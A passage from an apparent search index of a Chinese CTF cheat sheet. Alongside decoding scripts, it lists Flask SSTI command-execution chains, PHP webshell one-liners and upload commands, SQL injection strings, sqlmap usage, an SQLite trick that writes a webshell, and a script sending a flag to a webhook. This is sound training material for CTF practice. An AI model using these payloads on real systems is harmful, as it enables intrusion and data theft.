\"\u54b8\",\"\u6052\",\"\u9041\",\"\u5927\u58ee\",\"\u664b\",\"\u660e\u5937\",\"\u5bb6\u4eba\",\"\u777d\",\"\u8e47\",\"\u89e3\",\"\u635f\",\"\u76ca\",\"\u592c\",\"\u59e4\",\"\u8403\",\"\u5347\",\"\u56f0\",\"\u4e95\",\"\u9769\",\"\u9f0e\",\"\u9707\",\"\u826e\",\"\u6e10\",\"\u5f52\u59b9\",\"\u4e30\",\"\u65c5\",\"\u5dfd\",\"\u5151\",\"\u6da3\",\"\u8282\",\"\u4e2d\u5b5a\",\"\u5c0f\u8fc7\",\"\u65e2\u6d4e\",\"\u672a\u6d4e\"] s=\"\u5347\u76ca\u826e\u5f52\u59b9\u4e95\u8403\u65c5\u79bb\u65c5\u56f0\u672a\u6d4e\u5c6f\u672a\u6d4e\u4e2d\u5b5a\u672a\u6d4e\u5347\u56f0\u566c\u55d1\u9f0e\u9707\u5dfd\u566c\u55d1\u89e3\u8282\u4e95\u8403\u79bb\u672a\u6d4e\u8499\u5f52\u59b9\u5927\u755c\u65e0\u5984\u89e3\u5151\u4e34\u777d\u5347\u777d\u672a\u6d4e\u65e0\u5984\u9041\u6da3\u5f52\u59b9\" res = [] i = 0 while True: if s[i:i+1] in _64gua: res.append(_64gua.index(s[i])) i = i + 1 elif s[i:i+2] in _64gua: res.append(_64gua.index(s[i:i+2])) i = i + 2 else: res.append(s[i]) i = i + 1 if i >= len(s): break print(res) dic = { '\u5764': '000000', '\u5265': '000001', '\u6bd4': '000010', '\u89c2': '000011', '\u8c6b': '000100', '\u664b': '000101', '\u8403': '000110', '\u5426': '000111', '\u8c26': '001000', '\u826e': '001001', '\u8e47': '001010', '\u6e10': '001011', '\u5c0f\u8fc7': '001100', '\u65c5': '001101', '\u54b8': '001110', '\u9041': '001111', '\u5e08': '010000', '\u8499': '010001', '\u574e': '010010', '\u6da3': '010011', '\u89e3': '010100', '\u672a\u6d4e': '010101', '\u56f0': '010110', '\u8bbc': '010111', '\u5347': '011000', '\u86ca': '011001', '\u4e95': '011010', '\u5dfd': '011011', '\u6052': '011100', '\u9f0e': '011101', '\u5927\u8fc7': '011110', '\u59e4': '011111', '\u590d': '100000', '\u9890': '100001', '\u5c6f': '100010', '\u76ca': '100011', '\u9707': '100100', '\u566c\u55d1': '100101', '\u968f': '100110', '\u65e0\u5984': '100111', '\u660e\u5937': '101000', '\u8d32': '101001', '\u65e2\u6d4e': '101010', '\u5bb6\u4eba': '101011', '\u4e30': '101100', '\u79bb': '101101', '\u9769': '101110', '\u540c\u4eba': '101111', '\u4e34': '110000', '\u635f': '110001', '\u8282': '110010', '\u4e2d\u5b5a': '110011', '\u5f52\u59b9': '110100', '\u777d': '110101', '\u5151': '110110', '\u5c65': '110111', '\u6cf0': '111000', '\u5927\u755c': '111001', '\u9700': '111010', '\u5c0f\u755c': '111011', '\u5927\u58ee': '111100', '\u5927\u6709': '111101', '\u592c': '111110', '\u4e7e': '111111'} l = [] k = 0 # \u4e24\u4e2a\u5b57\u7b26\u7684\u6807\u5fd7\u4f4d for i in range(len(s)): if k == 1: k = 0 continue try: l.append(dic[s[i]]) except: l.append(dic[s[i]+s[i+1]]) k = 1 ss = ''.join(l) ss = ss + ('0'*(8- len(ss) % 8)) ss = int(ss, 2) ss = long_to_bytes(ss) s = base64.b64decode(ss)","title":"CTF\u5e38\u7528\u89e3\u5bc6\u811a\u672c"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_1","text":"import html s = \"&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;\" html . unescape ( s ) #key{you are right} # html.escape(s) # urlencode, urldecode from urllib import parse s = \"https://vjob.top/Bash/ %E 5%BA %94% E8%AF%A5 %E 7 %9F %A5 %E 9 %81% 93 %E 7%9A %84Li nux %E 6%8A %80% E5%B7%A7/\" print ( parse . unquote ( s )) # parse.quote(s) # \u667a\u80fd\u5224\u65ad\u7f16\u7801\u7c7b\u578b import chardet chardet . detect ( s . encode ( 'utf-8' )) # {'encoding': 'utf-8', 'confidence': 0.99, 'language': ''}","title":"\u7f16\u7801\u89e3\u7801"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_2","text":"x = b 'SRJPSQBUJYPHNC' for i in range ( 1 , 26 ): r = [] for j in x : if j == ord ( ' ' ): r . append ( j ) continue t = j + i if j <= ord ( 'z' ) and j >= ord ( 'a' ): if t > ord ( 'z' ): t = t - ord ( 'z' ) + ord ( 'a' ) - 1 elif j <= ord ( 'Z' ) and j >= ord ( 'A' ): if t > ord ( 'Z' ): t = t - ord ( 'Z' ) + ord ( 'A' ) - 1 r . append ( t ) print ( bytes ( r ))","title":"\u7206\u7834"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_3","text":"symbols = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890 !?.' ciphertext = input ( \"Please input ciphertext: \\n \" ) # guv6Jv6Jz!J6rp5r7Jzr66ntrM for key in range ( len ( symbols )): ciphers = symbols [ key :] + symbols [: key ] transtab = str . maketrans ( ciphers , symbols ) plaintext = ciphertext . translate ( transtab ) print ( f 'Key # { key } : { plaintext } ' ) # Key #13: This is my secret message. \u6839\u636e\u504f\u79fb\u91cf\u7684\u4e0d\u540c\uff0c\u8fd8\u5b58\u5728\u82e5\u5e72\u7279\u5b9a\u7684\u607a\u6492\u5bc6\u7801\u540d\u79f0\uff1a \u504f\u79fb\u91cf\u4e3a 10\uff1aAvocat \uff08A\u2192K\uff09 \u504f\u79fb\u91cf\u4e3a 13\uff1aROT13 \u504f\u79fb\u91cf\u4e3a -5\uff1aCassis \uff08K 6\uff09 \u504f\u79fb\u91cf\u4e3a -6\uff1aCassette \uff08K 7\uff09","title":"\u51ef\u6492\u5bc6\u7801"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#base64","text":"import base64 import string str1 = \"mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==\" string1 = \"AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+\" string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print ( base64 . b64decode ( str1 . translate ( str . maketrans ( string1 , string2 ))))","title":"base64\u6362\u8868"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#aes","text":"from Crypto.Cipher import AES def AES_Encrypt ( key , data ): #vi = b'0102030405060708' #cipher = AES.new(key, AES.MODE_CBC vi) cipher = AES . new ( key , AES . MODE_ECB ) #pad = lambda s: s + (16 - len(s)%16) * (16 - len(s)%16).to_bytes(1,\"little\") #data = pad(data) encryptedbytes = cipher . encrypt ( data ) return encryptedbytes def AES_Decrypt ( key , data ): #vi = b'0102030405060708' #cipher = AES.new(key, AES.MODE_CBC vi) cipher = AES . new ( key , AES . MODE_ECB ) text_decrypted = cipher . decrypt ( data ) #unpad = lambda s: s[0:-s[-1]] #text_decrypted = unpad(text_decrypted) return text_decrypted rawkey = b 'this_is_the_key.' key = [] for i in range ( 0 , len ( rawkey ), 2 ): key . append ( rawkey [ i + 1 ]) key . append ( rawkey [ i ]) key = bytes ( key ) print ( \"key = \" , key ) data = [ 21 , - 93 , - 68 , - 94 , 86 , 117 , - 19 , - 68 , - 92 , 33 , 50 , 118 , 16 , 13 , 1 , - 15 , - 13 , 3 , 4 , 103 , - 18 , 81 , 30 , 68 , 54 , - 93 , 44 , - 23 , 93 , 98 , 5 , 59 ] enctext = b \"\" # int.from_bytes(data, byteorder='big', signed=True) for x in data : enctext = enctext + ( x % 256 ) . to_bytes ( 1 , \"little\" ) print ( \"data = \" , enctext ) #data = bytes(data) #key = b'0CoJUm6Qyw8W8jud' #data = b'sdadsdsdsfd' #enctext = AES_Encrypt(key, data) text_decrypted = AES_Decrypt ( key , enctext ) print ( text_decrypted )","title":"AES\u52a0\u5bc6\u89e3\u5bc6"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_4","text":"\u53c8\u8bd1\u4e3a\u6469\u65af\u5bc6\u7801\uff0cMorse code MorseList = { \".-\" : \"A\" , \"-...\" : \"B\" , \"-.-.\" : \"C\" , \"-..\" : \"D\" , \".\" : \"E\" , \"..-.\" : \"F\" , \"--.\" : \"G\" , \"....\" : \"H\" , \"..\" : \"I\" , \".---\" : \"J\" , \"-.-\" : \"K\" , \".-..\" : \"L\" , \"--\" : \"M\" , \"-.\" : \"N\" , \"---\" : \"O\" , \".--\uff0e} def morse ( string , sign = \" \" ): lists = string . split ( sign ) for code in lists : print ( MorseList . get ( code ), end = \"\" ) morse ( \"..-./.-../.-/--.\" , \"/\" )","title":"\u6469\u5c14\u65af\u7535\u7801"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#struct","text":"import struct struct . pack ( '>I' , 16 ) # '\\x00\\x00\\x00\\x10' # pack\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5904\u7406\u6307\u4ee4\uff0c'>I'\u7684\u610f\u601d\u662f\uff1a # >\u8868\u793a\u5b57\u8282\u987a\u5e8f\u662fbig-endian\uff0c\u4e5f\u5c31\u662f\u7f51\u7edc\u5e8f\uff0cI\u8868\u793a4\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002 struct . unpack ( '>IH' , b ' \\xf0\\xf0\\xf0\\xf0\\x80\\x80 ' ) # (4042322160, 32896) # bytes\u4f9d\u6b21\u53d8\u4e3a I\uff1a4\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570 H\uff1a2\u5b57\u8282\u65e0\u7b26\u53f7\u6574\u6570\u3002","title":"struct \u6a21\u5757"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#simplehttpserver","text":"#!/usr/bin/env python3 import http.server as SimpleHTTPServer import socketserver as SocketServer PORT = 8001 class GetHandler ( SimpleHTTPServer . SimpleHTTPRequestHandler ): def do_GET ( self ): ip = self . client_address [ 0 ] print ( \"---------\" + ip + \"----------\" ) print ( self . headers ) self . send_response ( 200 ) self . send_header ( 'Content-type' , 'text/plain' ) self . end_headers () if self . path . endswith ( '/flag' ): self . wfile . write ( b 'flag {xxx} ' ) else : #SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) self . wfile . write ( ip . encode ()) Handler = GetHandler httpd = SocketServer . TCPServer (( \"\" , PORT ), Handler ) httpd . serve_forever () ### payload.js var request = new XMLHttpRequest (); request . onload = sendBack ; request . open ( 'GET' , 'https://xtra-salty-sardines.web.actf.co/flag' ); request . send (); function sendBack (){ location = '<WEB HOOK URL>/result?result=' + btoa ( this . responseText ); # https://webhook.site/ }","title":"SimpleHTTPServer"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_5","text":"#Python\uff1a\u6392\u5217\u7ec4\u5408\u4e09\u4e2a\u51fd\u6570permutations,combinations,product from itertools import permutations , combinations , product a = [ 1 , 2 , 3 , 4 ] b = [ 5 , 6 , 7 , 8 ] A = permutations ( a , 3 ) # \u6392\u5217 print ( list ( A )) B = combinations ( a , 3 ) # \u7ec4\u5408 print ( list ( B )) C = product ( a , b ) # \u4e24\u4e2a\u96c6\u5408\u5143\u7d20\u7684\u4e92\u7ec4\u5408 print ( list ( C ))","title":"\u6392\u5217\u7ec4\u5408"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#python-web","text":"SSTI http://114.67.175.224:15295/?flag ={{ 4 *4 }} #\u786e\u8ba4\u5b58\u5728SSTI http://114.67.175.224:15295/?flag ={{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()}} #\u3000\u67e5\u770b\u51fd\u6570, OBJECT.__class__.__mro__[1].__subclasses__() http://114.67.175.224:15295/?flag ={{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]}} \u3000 # \u5b9a\u4f4dPopen {{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]( 'id' , shell = True, stdout = -1 ) .communicate ()[ 0 ] .strip () }} #\u6267\u884c\u547d\u4ee4 {{ '' .__class__.__mro__ [ 1 ] .__subclasses__ ()[ 425 ]( 'cat flag ' , shell = True, stdout = -1 ) .communicate ()[ 0 ] .strip () }} # \u83b7\u53d6flag # \u5e38\u7528\u5230\u7684\u51e0\u4e2a\u9b54\u672f\u65b9\u6cd5 __class__ () \u8fd4\u56de\u5bf9\u8c61\u7684\u7c7b __base__ () /__mro__ () \u8fd4\u56de\u7c7b\u6240\u7ee7\u627f\u7684\u57fa\u7c7b __subclasses__ () \u8fd4\u56de\u7ee7\u627f\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b ### {{ '' [ request.args.a ][ request.args.b ][ 2 ][ request.args.c ]()[ 40 ]( '/opt/flag_xxx.txt' )[ request.args.d ]()}} ? & a = __class__ & b = __mro__ & c = __subclasses__ & d = read ### ### Flask\u7279\u6709\u7684\u53d8\u91cf\u548c\u51fd\u6570 config \u3000\u3000config \u5bf9\u8c61\u5c31\u662fFlask\u7684config\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f app.config \u5bf9\u8c61 request \u3000\u3000Flask\u4e2d\u4ee3\u8868\u5f53\u524d\u8bf7\u6c42\u7684request\u5bf9\u8c61 session \u3000\u3000Flask\u7684session\u5bf9\u8c61 url_for () \u3000\u3000url_for\u4f1a\u6839\u636e\u4f20\u5165\u7684\u8def\u7531\u5668\u51fd\u6570\u540d,\u8fd4\u56de\u8be5\u8def\u7531\u5bf9\u5e94\u7684URL,\u5728\u6a21\u677f\u4e2d\u59cb\u7ec8\u4f7f\u7528url_for () \u5c31\u53ef\u4ee5\u5b89\u5168\u7684\u4fee\u6539\u8def\u7531\u7ed1\u5b9a\u7684URL,\u5219\u4e0d\u6bd4\u62c5\u5fc3\u6a21\u677f\u4e2d\u6e32\u67d3\u51fa\u9519\u7684\u94fe\u63a5 get_flashed_messages () \u3000\u3000\u8fd9\u4e2a\u51fd\u6570\u4f1a\u8fd4\u56de\u4e4b\u524d\u5728flask\u4e2d\u901a\u8fc7flask () \u4f20\u5165\u7684\u6d88\u606f\u7684\u5217\u8868\uff0cflash\u51fd\u6570\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u53ef\u4ee5\u628a\u7531Python\u5b57\u7b26\u4e32\u8868\u793a\u7684\u6d88\u606f\u52a0\u5165\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u518d\u4f7f\u7528get_flashed_message () \u51fd\u6570\u53d6\u51fa\u5b83\u4eec\u5e76\u6d88\u8d39\u6389 # {{get_flashed_messages.__globals__['current_app'].config}} # {{url_for.__globals__['current_app'].config}} # tplmap https://github.com/epinna/tplmap.git","title":"Python Web"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#php-web","text":"eval ( \"var_dump( $a );\" ) ; # var_dump(file('flag.php')); eval ( \"var_dump( $args );\" ) ; # var_dump(GLOBALS); php://filter/read = convert.base64-encode/resource = index.php\u3000\u3000 #\u6587\u4ef6\u5305\u542b https://blog.csdn.net/qq_32393893/article/details/110228864 key1 []= 1 & key2 []= 2 \u3000 # md5($key1) == md5($key2) && $key1 !== $key2 assert ( $_GET [ 's' ]) # ?s=system('ls') system | readfile | gz | exec | eval | cat | assert | file | fgets #passthru ### never_give_up # curl -X POST \"http://ip:port/index.php?id=x&a=php://input&b=%0012345\" --data \"bugku is a nice plateform!\" # file_get_contents \u7528 php://input \u7ed5\u8fc7 if ( ! $_GET [ 'id' ]) { header ( 'Location: hello.php?id=1' ) ; exit () ; } $id = $_GET [ 'id' ] ; $a = $_GET [ 'a' ] ; $b = $_GET [ 'b' ] ; if ( stripos ( $a , '.' )) { echo 'no no no no no no no' ; return ; } $data = @file_get_contents ( $a , 'r' ) ; if ( $data == \"bugku is a nice plateform!\" and $id == 0 and strlen ( $b ) >5 and eregi ( \"111\" .substr ( $b ,0,1 ) , \"1114\" ) and substr ( $b ,0,1 ) ! = 4 ) { $flag = \"flag{***********}\" } else { print \"never never never give up !!!\" ; } # \u6570\u7ec4\u7ed5\u8fc7 ( $v1 ! = $v2 && md5 ( $v1 ) == md5 ( $v2 )) # v1[]=1&v2[]=2 md5 ( array ()) = null sha1 ( array ()) = null ereg ( pattern,array ()) = null vs preg_match ( pattern,array ) = false strcmp ( array () , \"abc\" ) = null strpos ( array () , \"abc\" ) = null #\u5e8f\u5217\u5316 \u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u4e2a\u6570\u7684\u5c5e\u6027\u65f6\u5c31\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c\u3002\u3000\u3000 #\u7ed5\u8fc7__wakeup()\u51fd\u6570 \u6839\u636e\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\u7684\u4e0d\u540c \u5e8f\u5217\u5316\u540e\u7684 \u5c5e\u6027\u957f\u5ea6\u548c\u5c5e\u6027\u503c\u4f1a\u6709\u6240\u4e0d\u540c # - public ( \u516c\u6709 ) - protected ( \u53d7\u4fdd\u62a4 ) - private ( \u79c1\u6709\u7684 ) - protected\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00*%00\u5c5e\u6027\u540d - private\u5c5e\u6027\u88ab\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c5e\u6027\u503c\u4f1a\u53d8\u6210\uff1a%00\u7c7b\u540d%00\u5c5e\u6027\u540d <?php class ctf { protected $username = 'admin' ; //protected $cmd = 'file(\"flag.php\")' ; protected $cmd = 'tac flag.php' ; } $ctf = new ctf () ; var_dump ( serialize ( $ctf )) ; ?> $ php -f test.php string ( 78 ) \"O:3:\" ctf \":2:{s:11:\" *username \";s:5:\" admin \";s:6:\" *cmd \";s:12:\" tac flag.php \";}\" #\u77ed\u6807\u7b7e\u7ed5\u8fc7 ?flag = $a = 'blag' ; $a { 0 }= 'f' ; ?>11111110001111111 ; <? = $$ a ; ?>, \uff08\u7528<? = ?>\u4ee3\u66ffphp\u6807\u7b7e\u3002<? = ?>\u77ed\u6807\u7b7e\u4f1a\u76f4\u63a5\u628aphp\u7684\u7ed3\u679c\u8f93\u51fa\uff0c<? ?>\u7684\u529f\u80fd\u5219\u548c<?php?>\u5b8c\u5168\u4e00\u6837\u3002\u8fc7\u6ee4\u7a7a\u683c\u53ef\u4ee5\u7528 \\t \u7ed5\u8fc7\uff0c\u6216\u8005%09\u4e5f\u662ftab\u7684URL\u7f16\u7801\u3002php\u53cd\u5f15\u53f7\u4e2d\u7684\u5b57\u7b26\u4e32\u4f1a\u88ab\u5f53\u4f5c\u547d\u4ee4\u6267\u884c\uff09 \u901a\u8fc7php\u5185\u7f6e\u534f\u8bae\u76f4\u63a5\u8bfb\u53d6\u4ee3\u7801 /index.php?page = php://filter/read = convert.base64-encode/resource = index.php PHP\u6570\u7ec4key\u6ea2\u51fa\uff0c\u7b80\u5355\u7684\u8bf4\u5c31\u662fstuff [ 4294967296 ] \u8868\u793a\u7684\u503c\uff0c\u4e0estuff [ 0 ] \u662f\u4e00\u4e2a \u53c2\u8003https://bugs.php.net/bug.php?id = 69892\u7684\u63d0\u793a","title":"PHP Web"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#nodejs","text":"vm . run ( Buffer ( 500 ) ); // \u5728\u8f83\u65e9\u4e00\u70b9\u7684 node \u7248\u672c\u4e2d (8.0 \u4e4b\u524d)\uff0c\u5f53 Buffer \u7684\u6784\u9020\u51fd\u6570\u4f20\u5165\u6570\u5b57\u65f6, \u4f1a\u5f97\u5230\u4e0e\u6570\u5b57\u957f\u5ea6\u4e00\u81f4\u7684\u4e00\u4e2a Buffer\uff0c\u5e76\u4e14\u8fd9\u4e2a Buffer \u662f\u672a\u6e05\u96f6\u7684\u30028.0 \u4e4b\u540e\u7684\u7248\u672c\u53ef\u4ee5\u901a\u8fc7\u53e6\u4e00\u4e2a\u51fd\u6570 Buffer.allocUnsafe(size) \u6765\u83b7\u5f97\u672a\u6e05\u7a7a\u7684\u5185\u5b58\u3002","title":"NodeJS"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#curl","text":"#\u4e0a\u4f20\u6587\u4ef6test.png curl -X POST -F \"file=@test.png\" -H \"Content-Type: multipart/form-data\" 'http://host:port/post-file-path' # IP \u7ed5\u8fc7: -H \"X-Forwarded-For: 127.0.0.1\" # PHP \u4e00\u53e5\u8bdd\u6728\u9a6c \u5f62\u5f0f\uff11\u3000<?php eval ( @ $_POST [ '_' ]) ; ?> \u5f62\u5f0f\uff12\u3000<script language = \"php\" >@eval ( $_POST [ _ ]) </script> \u3000 curl ... --data-raw 'image=data%3Aimage/php%3Bbase64%2CPD9waHAgZXZhbChAJF9QT1NUWydfJ10pOyA/Pg%3D%3D' curl -X POST ... --data \"_=system(%22ls%22);\" curl ... -F \"file=@a.php4;type=image/jpeg\" -H \"Content-Type: multiPart/Form-data\" 'http://host:port/post-file-path'","title":"curl"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#sql","text":"0 ' union select 1,2,3,4# #\u5b58\u5728\u6ce8\u5165 0' union select 1 , 2 , 3 , database () # # \u6570\u636e\u5e93\u540d 0 ' union select 1,2,3,table_name from information_schema.tables where table_schema=' skctf '#\u3000#\u8868\u540d 0' union select 1 , 2 , 3 , column_name from information_schema . columns where table_name = 'fl4g' # # \u5217\u540d 0 ' union select 1,2,3,skctf_flag from fl4g# # flag{...} python sqlmap.py -u ' http : // 114 . 67 . 175 . 224 : 13433 / index . php ' --data ' id = 1 ' --current-db python sqlmap.py -u ' http : // 114 . 67 . 175 . 224 : 13433 / index . php ' --data ' id = 1 ' --dump 1' ; SHOW DATABASES ; # # \u6570\u636e\u5e93\u540d 1 '; SHOW TABLES from ctftraining;# #\u8868\u540d 1' ; use ctftraining ; show columns from FLAG_TABLE ; # # \u5217\u540d # list ( b \"select * from supersqli.1919810931114514\" ) # Python convert , \u5173\u952e\u5b57 select | update | delete | drop | insert | where | . \u88ab\u8fc7\u6ee4 1 ';SET @a=char(115, 101, 108, 101, 99, 116, 32, 42, 32, 102, 114, 111, 109, 32, 115, 117, 112, 101, 114, 115, 113, 108, 105, 46, 49, 57, 49, 57, 56, 49, 48, 57, 51, 49, 49, 49, 52, 53, 49, 52);PREPARE hacker from @a;EXECUTE hacker;# # SQLlite ATTACH database can be used to write file ATTACH DATABASE ' XXX . php ' AS a ; CREATE TABLE a . b ( c text ); INSERT INTO a . b ( c ) VALUES ( \\ \"<?php system($_GET[0]); ?> \\\" );","title":"SQL\u6ce8\u5165"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_6","text":"# Android\u5907\u4efd\u6587\u4ef6\u89e3\u538b ( printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\" ; tail -c +25 app3.ab ) | tar xfvz - # \u6253\u5370\u6587\u4ef6 xargs cat < files # GitHack https://github.com/lijiejie/GitHack.git #git-dumper https://github.com/arthaud/git-dumper # GitTools https://github.com/internetwache/GitTools","title":"\u5176\u5b83"},{"location":"other/CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/#_7","text":"_64gua = [ \"\u4e7e\",\"\u5764\",\"\u5c6f\",\"\u8499\",\"\u9700\",\"\u8bbc\",\"\u5e08\",\"\u6bd4\",\"\u5c0f\u755c\",\"\u5c65\",\"\u6cf0\",\"\u5426\",\"\u540c\u4eba\",\"\u5927\u6709\",\"\u8c26\",\"\u8c6b\",\"\u968f\",\"\u86ca\",\"\u4e34\",\"\u89c2\",\"\u566c\u55d1\",\"\u8d32\",\"\u5265\",\"\u590d\",\"\u65e0\u5984\",\"\u5927\u755c\",\"\u9890\",\"\u5927\u8fc7\",\"\u574e\",\"\u79bb\", \"\u54b8\",\"\u6052\",\"\u9041\",\"\u5927\u58ee\",\"\u664b\",\"\u660e\u5937\",\"\u5bb6\u4eba\",\"\u777d\",\"\u8e47\",\"\u89e3\",\"\u635f\",\"\u76ca\",\"\u592c\",\"\u59e4\",\"\u8403\",\"\u5347\",\"\u56f0\",\"\u4e95\",\"\u9769\",\"\u9f0e\",\"\u9707\",\"\u826e\",\"\u6e10\",\"\u5f52\u59b9\",\"\u4e30\",\"\u65c5\",\"\u5dfd\",\"\u5151\",\"\u6da3\",\"\u8282\",\"\u4e2d\u5b5a\",\"\u5c0f\u8fc7\",\"\u65e2\u6d4e\",\"\u672a\u6d4e\"] s=\"\u5347\u76ca\u826e\u5f52\u59b9\u4e95\u8403\u65c5\u79bb\u65c5\u56f0\u672a\u6d4e\u5c6f\u672a\u6d4e\u4e2d\u5b5a\u672a\u6d4e\u5347\u56f0\u566c\u55d1\u9f0e\u9707\u5dfd\u566c\u55d1\u89e3\u8282\u4e95\u8403\u79bb\u672a\u6d4e\u8499\u5f52\u59b9\u5927\u755c\u65e0\u5984\u89e3\u5151\u4e34\u777d\u5347\u777d\u672a\u6d4e\u65e0\u5984\u9041\u6da3\u5f52\u59b9\" res = [] i = 0 while True: if s[i:i+1] in _64gua: res.append(_64gua.index(s[i])) i = i + 1 elif s[i:i+2] in _64gua: res.append(_64gua.index(s[i:i+2])) i = i + 2 else: res.append(s[i]) i = i + 1 if i >= len(s): break print(res) dic = { '\u5764': '000000', '\u5265': '000001', '\u6bd4': '000010', '\u89c2': '000011', '\u8c6b': '000100', '\u664b': '000101', '\u8403': '000110', '\u5426': '000111', '\u8c26': '001000', '\u826e': '001001', '\u8e47': '001010', '\u6e10': '001011', '\u5c0f\u8fc7': '001100', '\u65c5': '001101', '\u54b8': '001110', '\u9041': '001111', '\u5e08': '010000', '\u8499': '010001', '\u574e': '010010', '\u6da3': '010011', '\u89e3': '010100', '\u672a\u6d4e': '010101', '\u56f0': '010110', '\u8bbc': '010111', '\u5347': '011000', '\u86ca': '011001', '\u4e95': '011010', '\u5dfd': '011011', '\u6052': '011100', '\u9f0e': '011101', '\u5927\u8fc7': '011110', '\u59e4': '011111', '\u590d': '100000', '\u9890': '100001', '\u5c6f': '100010', '\u76ca': '100011', '\u9707': '100100', '\u566c\u55d1': '100101', '\u968f': '100110', '\u65e0\u5984': '100111', '\u660e\u5937': '101000', '\u8d32': '101001', '\u65e2\u6d4e': '101010', '\u5bb6\u4eba': '101011', '\u4e30': '101100', '\u79bb': '101101', '\u9769': '101110', '\u540c\u4eba': '101111', '\u4e34': '110000', '\u635f': '110001', '\u8282': '110010', '\u4e2d\u5b5a': '110011', '\u5f52\u59b9': '110100', '\u777d': '110101', '\u5151': '110110', '\u5c65': '110111', '\u6cf0': '111000', '\u5927\u755c': '111001', '\u9700': '111010', '\u5c0f\u755c': '111011', '\u5927\u58ee': '111100', '\u5927\u6709': '111101', '\u592c': '111110', '\u4e7e': '111111'} l = [] k = 0 # \u4e24\u4e2a\u5b57\u7b26\u7684\u6807\u5fd7\u4f4d for i in range(len(s)): if k == 1: k = 0 continue try: l.append(dic[s[i]]) except: l.append(dic[s[i]+s[i+1]]) k = 1 ss = ''.join(l) ss = ss + ('0'*(8- len(ss) % 8)) ss = int(ss, 2) ss = long_to_bytes(ss) s = base64.b64decode(ss)","title":"\u516d\u5341\u56db\u5366"},{"location":"other/FFmpeg%E5%8A%9F%E8%83%BD%E5%91%BD%E4%BB%A4%E6%B1%87%E6%80%BB/","text":"\u524d\u8a00 \u5982\u6b64\u5f3a\u5927\u7684FFmpeg\uff0c\u80fd\u591f\u5b9e\u73b0\u89c6\u9891\u91c7\u96c6\u3001\u89c6\u9891\u683c\u5f0f\u8f6c\u5316\u3001\u89c6\u9891\u622a\u56fe\u3001\u89c6\u9891\u6dfb\u52a0\u6c34\u5370\u3001\u89c6\u9891\u5207\u7247\u3001\u89c6\u9891\u5f55\u5236\u3001\u89c6\u9891\u63a8\u6d41\u3001\u66f4\u6539\u97f3\u89c6\u9891\u53c2\u6570\u529f\u80fd\u7b49\u3002\u901a\u8fc7\u7ec8\u7aef\u547d\u4ee4\u5982\u4f55\u5b9e\u73b0\u8fd9\u4e9b\u529f\u80fd\uff0cRichy\u5728\u672c\u6587\u505a\u4e00\u8bb0\u5f55\uff0c\u4ee5\u5907\u4e4b\u540e\u67e5\u9605\u3002 \u6ce8\u610f\uff1a\u4e0b\u9762\u4e00\u4e00\u5217\u4e3e\u7684\u547d\u4ee4\uff0c\u672a\u5f52\u7c7b\u6574\u7406\uff0c\u547d\u4ee4\u53c2\u6570\u4f9b\u53c2\u8003\u3002 